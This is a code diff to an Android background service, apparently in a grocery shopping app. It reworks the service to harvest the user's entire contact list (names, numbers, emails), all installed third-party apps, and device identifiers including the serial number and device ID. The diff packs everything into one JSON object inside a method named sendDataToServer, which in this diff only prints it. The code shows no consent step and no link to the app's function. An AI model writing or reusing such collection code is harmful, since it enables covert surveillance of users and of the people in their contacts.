@@ -9,6 +9,11 @@ import android.database.Cursor;
 import android.provider.ContactsContract;
 import android.util.Log;
 
+import com.rgretail.grocermax.utils.UtilityMethods;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -18,15 +23,38 @@ import java.util.List;
 public class ContactInfoService extends IntentService {
 
 
+    JSONObject informationData;
+    JSONArray contact_info;
+    JSONObject device_info;
+    JSONArray application_info;
     public ContactInfoService() {
         super("ContactInfoService");
     }
 
     @Override
     protected void onHandleIntent(Intent intent) {
-        pushContacts();
-        getApplicationDetails();
-        getDeviceInfo();
+        informationData=new JSONObject();
+        contact_info=new JSONArray();
+        device_info=new JSONObject();
+        application_info=new JSONArray();
+        try {
+            pushContacts();
+            getApplicationDetails();
+            getDeviceInfo();
+            sendDataToServer();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    public void sendDataToServer(){
+        try {
+            informationData.put("Contact_info",contact_info);
+            informationData.put("Application_info",application_info);
+            informationData.put("Device_info",device_info);
+            System.out.println("informationData.toString() = " + informationData.toString());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     public void pushContacts() {
@@ -54,57 +82,71 @@ public class ContactInfoService extends IntentService {
     }
 
     public void pushContacts(List<ContactModel> contactsList){
-        System.out.println("New Batch");
         for(int i=0;i<contactsList.size();i++){
-            System.out.println("Contct Name="+contactsList.get(i).getContact_name());
-            System.out.println("Contct id="+contactsList.get(i).getContact_id());
-            for(int j=0;j<contactsList.get(i).getContact_no().size();j++){
-                System.out.println("Contct No"+j+"="+contactsList.get(i).getContact_no().get(j));
+            try {
+                JSONObject cont=new JSONObject();
+                cont.put("name",contactsList.get(i).getContact_name());
+                cont.put("id",contactsList.get(i).getContact_id());
+                JSONArray numberArray=new JSONArray();
+                for(int j=0;j<contactsList.get(i).getContact_no().size();j++){
+                    numberArray.put(contactsList.get(i).getContact_no().get(j));
+                }
+                JSONArray emailArray=new JSONArray();
+                for(int j=0;j<contactsList.get(i).getContact_email().size();j++){
+                    emailArray.put(contactsList.get(i).getContact_email().get(j));
+                }
+                cont.put("numbers",numberArray);
+                cont.put("emails",emailArray);
+                contact_info.put(cont);
+            } catch (Exception e) {
+                e.printStackTrace();
             }
-            for(int j=0;j<contactsList.get(i).getContact_email().size();j++){
-                System.out.println("Contct Email"+j+"="+contactsList.get(i).getContact_email().get(j));
-            }
-            System.out.println("Contct ------------------------------------------------------------------");
         }
-        System.out.println("/////////////////////////////////////////////////////////////////////////");
     }
 
     public void getDeviceInfo(){
-         String OSNAME = System.getProperty("os.name");
-        System.out.println("APP OSNAME = " + OSNAME);
-         String OSVERSION = System.getProperty("os.version");
-        System.out.println("APPOSVERSION = " + OSVERSION);
-         String RELEASE = android.os.Build.VERSION.RELEASE;
-        System.out.println("APP RELEASE = " + RELEASE);
-         String DEVICE = android.os.Build.DEVICE;
-        System.out.println("APP DEVICE = " + DEVICE);
-         String MODEL = android.os.Build.MODEL;
-        System.out.println("APP MODEL = " + MODEL);
-         String PRODUCT = android.os.Build.PRODUCT;
-        System.out.println("APP PRODUCT = " + PRODUCT);
-         String BRAND = android.os.Build.BRAND;
-        System.out.println("APP BRAND = " + BRAND);
-         String DISPLAY = android.os.Build.DISPLAY;
-        System.out.println("APP DISPLAY = " + DISPLAY);
-         String CPU_ABI = android.os.Build.CPU_ABI;
-        System.out.println("APP CPU_ABI = " + CPU_ABI);
-         String CPU_ABI2 = android.os.Build.CPU_ABI2;
-        System.out.println("APP CPU_ABI2 = " + CPU_ABI2);
-         String UNKNOWN = android.os.Build.UNKNOWN;
-        System.out.println("APP UNKNOWN = " + UNKNOWN);
-         String HARDWARE = android.os.Build.HARDWARE;
-        System.out.println("APP HARDWARE = " + HARDWARE);
-         String ID = android.os.Build.ID;
-        System.out.println("APP ID = " + ID);
-         String MANUFACTURER = android.os.Build.MANUFACTURER;
-        System.out.println("APP MANUFACTURER = " + MANUFACTURER);
-         String SERIAL = android.os.Build.SERIAL;
-        System.out.println("APP SERIAL = " + SERIAL);
-         String USER = android.os.Build.USER;
-        System.out.println("APP USER = " + USER);
-         String HOST = android.os.Build.HOST;
-        System.out.println("APP HOST = " + HOST);
+        try {
+            String OSNAME = System.getProperty("os.name");
+            device_info.put("os_name",OSNAME);
 
+            String OSVERSION = System.getProperty("os.version");
+            device_info.put("os_version",OSVERSION);
+
+            String RELEASE = android.os.Build.VERSION.RELEASE;
+            device_info.put("release_version",RELEASE);
+
+            String DEVICE = android.os.Build.DEVICE;
+            device_info.put("device",DEVICE);
+
+            String MODEL = android.os.Build.MODEL;
+            device_info.put("model",MODEL);
+
+            String PRODUCT = android.os.Build.PRODUCT;
+            device_info.put("product",PRODUCT);
+
+            String BRAND = android.os .Build.BRAND;
+            device_info.put("brand",BRAND);
+
+            String DISPLAY = android.os.Build.DISPLAY;
+            device_info.put("display",DISPLAY);
+
+            String MANUFACTURER = android.os.Build.MANUFACTURER;
+            device_info.put("manufacturer",MANUFACTURER);
+
+            String SERIAL = android.os.Build.SERIAL;
+            device_info.put("serial",SERIAL);
+
+            String USER = android.os.Build.USER;
+            device_info.put("user",USER);
+
+            device_info.put("device_id", UtilityMethods.getDeviceId(this));
+
+            String HOST = android.os.Build.HOST;
+            System.out.println("APP HOST = " + HOST);
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
 
     }
@@ -168,33 +210,42 @@ public class ContactInfoService extends IntentService {
     }
 
 
-   public List<AppsInfoModel> getApplicationDetails(){
+   public void getApplicationDetails(){
 
-       List<AppsInfoModel> appsInfoList=new ArrayList<>();
+     //  List<AppsInfoModel> appsInfoList=new ArrayList<>();
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        for (int i=0; i < packList.size(); i++)
        {
-           PackageInfo packInfo = packList.get(i);
-           if ( (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
-           {
-               String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
-               String appPackage=packInfo.packageName;
-               String versionName=packInfo.versionName;
-               String versionCode=String.valueOf(packInfo.versionCode);
-               appsInfoList.add(new AppsInfoModel(appPackage,appName,versionName,versionCode));
-               Log.e("App № " + Integer.toString(i), appName);
+           try {
+               JSONObject appInfo=new JSONObject();
+               PackageInfo packInfo = packList.get(i);
+               if ( (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
+               {
+                   String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
+                   String appPackage=packInfo.packageName;
+                   String versionName=packInfo.versionName;
+                   String versionCode=String.valueOf(packInfo.versionCode);
+                   appInfo.put("appName",appName);
+                   appInfo.put("appPackage",appPackage);
+                   appInfo.put("versionName",versionName);
+                   appInfo.put("versionCode",versionCode);
+                   application_info.put(appInfo);
+                   //appsInfoList.add(new AppsInfoModel(appPackage,appName,versionName,versionCode));
+
+               }
+           } catch (Exception e) {
+               e.printStackTrace();
            }
        }
 
-       for(int i=0;i<appsInfoList.size();i++){
+       /*for(int i=0;i<appsInfoList.size();i++){
            System.out.println("App number ="+(i+1));
            System.out.println("App name = " + appsInfoList.get(i).getApp_name());
            System.out.println("App package = " + appsInfoList.get(i).getApp_package_name());
            System.out.println("App versionName = " + appsInfoList.get(i).getApp_version_name());
            System.out.println("App versionCode = " + appsInfoList.get(i).getApp_version_code());
-       }
+       }*/
 
-       return appsInfoList;
    }
 
 
